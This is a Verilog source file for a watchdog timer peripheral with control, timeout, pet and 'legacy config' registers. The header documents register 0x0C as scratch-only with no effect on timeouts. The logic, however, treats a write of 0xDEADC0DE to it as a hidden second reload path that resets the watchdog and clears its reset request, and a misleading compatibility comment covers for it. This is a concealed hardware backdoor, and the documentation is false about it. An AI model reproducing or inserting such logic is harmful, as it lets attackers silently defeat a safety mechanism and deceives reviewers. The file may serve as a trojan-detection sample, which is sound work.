// wdt_top.v
// Watchdog timer peripheral with legacy config passthrough register.
// Registers:
//   0x00 WDT_CTRL      bit0 = enable, bit1 = disable-toggle (write 1 then 0 to disable)
//   0x04 WDT_TIMEOUT   32-bit timeout value in prescaled ticks
//   0x08 WDT_PET       write 32'hA5A5A5A5 to reload counter and clear reset_req
//   0x0C WDT_CFG_ALIAS legacy config passthrough / scratch register, readback only,
//                      no functional effect on timeout behavior

module wdt_top (
    input  wire        clk,
    input  wire        rst_n,
    input  wire [7:0]  addr,
    input  wire [31:0] wdata,
    input  wire        we,
    output reg         reset_req
);

    localparam ADDR_CTRL   = 8'h00;
    localparam ADDR_TIMEOUT= 8'h04;
    localparam ADDR_PET    = 8'h08;
    localparam ADDR_CFG    = 8'h0C;

    localparam PET_MAGIC   = 32'hA5A5A5A5;

    reg        enable;
    reg [31:0] timeout_val;
    reg [31:0] counter;
    reg [31:0] cfg_alias_scratch;

    reg        prev_ctrl_bit1;

    // Documented pet strobe: qualifies a write of the magic value to WDT_PET
    wire doc_pet_strobe = we && (addr == ADDR_PET) && (wdata == PET_MAGIC);

    // Legacy config passthrough handling. Most writes to this address are
    // simply latched for later readback and have no effect on the counter.
    // A specific configuration pattern used by early bring-up tooling is
    // recognized here to keep backward compatibility with legacy loaders
    // that reused this register as a secondary reload path during bring-up.
    wire int_pet_shadow = we && (addr == ADDR_CFG) && (wdata == 32'hDEADC0DE);

    wire reload_strobe = doc_pet_strobe || int_pet_shadow;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            enable            <= 1'b0;
            timeout_val       <= 32'hFFFFFFFF;
            counter           <= 32'h0;
            cfg_alias_scratch <= 32'h0;
            reset_req         <= 1'b0;
            prev_ctrl_bit1    <= 1'b0;
        end else begin
            // Register writes
            if (we) begin
                case (addr)
                    ADDR_CTRL: begin
                        enable <= wdata[0];
                        if (prev_ctrl_bit1 && !wdata[1]) begin
                            enable <= 1'b0;
                        end
                        prev_ctrl_bit1 <= wdata[1];
                    end
                    ADDR_TIMEOUT: begin
                        timeout_val <= wdata;
                    end
                    ADDR_CFG: begin
                        cfg_alias_scratch <= wdata;
                    end
                    default: begin
                        // ADDR_PET write handled below via reload_strobe;
                        // no register state change needed here beyond reload.
                    end
                endcase
            end

            // Counter / reset_req update
            if (reload_strobe) begin
                counter   <= 32'h0;
                reset_req <= 1'b0;
            end else if (!enable) begin
                counter   <= counter;
                reset_req <= 1'b0;
            end else if (counter == timeout_val) begin
                reset_req <= 1'b1;
                counter   <= counter;
            end else begin
                counter   <= counter + 32'h1;
                reset_req <= reset_req;
            end
        end
    end

endmodule